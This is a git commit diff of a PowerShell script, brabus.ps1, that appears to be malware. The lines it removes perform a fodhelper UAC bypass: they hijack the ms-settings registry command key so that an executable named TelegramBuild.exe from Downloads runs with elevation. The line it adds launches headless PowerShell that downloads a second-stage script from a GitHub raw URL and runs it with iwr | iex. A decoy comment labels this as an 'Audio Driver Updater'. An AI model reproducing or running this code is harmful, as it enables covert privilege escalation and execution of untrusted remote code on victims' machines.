3ee4632383e32a57cfbee58bfd8e0a2014af5fa1
waed69 <waedpsn2@gmail.com>
2025-04-26 18:16:02 +0200

    Update brabus.ps1

--- brabus.ps1
+++ brabus.ps1
@@ -1,7 +1,2 @@
 New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
-New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
-Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Users\$env:USERNAME\not-existent-yet"
- 
-Copy-Item "C:\Users\$env:USERNAME\Downloads\TelegramBuild.exe" "C:\Users\$env:USERNAME\not-existent-yet"
- 
-fodhelper.exe
+Start-Process conhost.exe -ArgumentList "--headless powershell -Command `"iwr https://raw.githubusercontent.com/waed69/Brabus/main/brabus2.ps1 | iex; '# Audio Driver Updater 4.7X - (Build 2025.01.12)'`""
